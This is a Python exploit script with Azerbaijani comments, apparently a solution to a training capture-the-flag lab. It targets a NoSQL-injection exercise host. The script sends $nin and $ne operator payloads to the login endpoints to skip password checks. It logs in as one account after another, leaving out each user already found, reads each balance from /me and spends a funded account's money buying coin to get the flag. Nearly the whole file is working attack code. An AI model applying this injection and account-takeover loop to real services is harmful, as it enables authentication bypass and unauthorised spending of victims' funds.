import requests
import sys

# URL Tənzimləmələri
BASE_URL = "http://web0x01.hbtn/api/a3/nosql_injection"
# Sizin göndərdiyiniz sorğuya əsasən sign_in ola bilər, amma login də yoxlanılır
LOGIN_ENDPOINTS = [f"{BASE_URL}/login", f"{BASE_URL}/sign_in"]
ME_URL = f"{BASE_URL}/me"
CRYPTO_URL = f"{BASE_URL}/crypto"

# Tapılan və pulsuz olan istifadəçiləri bura yığacağıq ki, bir daha gəlməsinlər
ignore_users = []

print("[*] Ağıllı Enumerasiya Başlayır (Exclusion Method)...")

while True:
    # 1. Payload: İndiyə qədər tapdığımız adamları İstisna edirik ($nin)
    # Məna: Username bu siyahıda OLMASIN, parol isə boş olmasın.
    payload = {
        "username": {"$nin": ignore_users},
        "password": {"$ne": ""}
    }

    session = requests.Session()
    login_successful = False
    
    # Hər iki endpointi yoxlayaq
    for login_url in LOGIN_ENDPOINTS:
        try:
            r = session.post(login_url, json=payload, allow_redirects=False)
            if r.status_code in [200, 204, 302] and 'session' in session.cookies.get_dict():
                login_successful = True
                break # Giriş uğurludur
        except:
            continue
            
    if not login_successful:
        print("[-] Daha başqa istifadəçi qalmadı və ya giriş alınmadı.")
        break

    # 2. Kim olduğumuzu yoxlayaq (/me)
    me_req = session.get(ME_URL)
    
    # Əgər /me boşdursa, username-i tapmaq çətindir, amma davam edək
    username = "unknown"
    balance = 0
    
    if me_req.status_code == 200:
        try:
            data = me_req.json()
            username = data.get("username", "unknown")
            balance = data.get("balance", 0)
        except:
            print("[!] JSON xətası /me endpointində.")
            pass
            
    print(f"[+] Yoxlanılır: User: '{username}' | Balans: {balance}")

    # 3. Pulu varsa, dərhal alırıq!
    if balance > 0:
        print(f"[!!!] BINGO! '{username}' istifadəçisinin pulu var! Coin alınır...")
        
        buy_payload = {"amount": 1, "currency": "HBTNc"}
        buy_req = session.post(CRYPTO_URL, json=buy_payload)
        
        print("\n" + "#"*50)
        print("FLAG AŞAĞIDADIR:")
        print(buy_req.text)
        print("#"*50 + "\n")
        sys.exit()
    
    # 4. Pulu yoxdursa, siyahıya əlavə et ki, növbəti dəfə bunu çağırmasın
    if username != "unknown":
        ignore_users.append(username)
    else:
        # Əgər username-i oxuya bilməsək, sonsuz dövrə düşməmək üçün dayanırıq
        print("[!] İstifadəçi adı oxuna bilmədi, skript dayandırılır.")
        break

print("[-] Axtarış bitdi.")
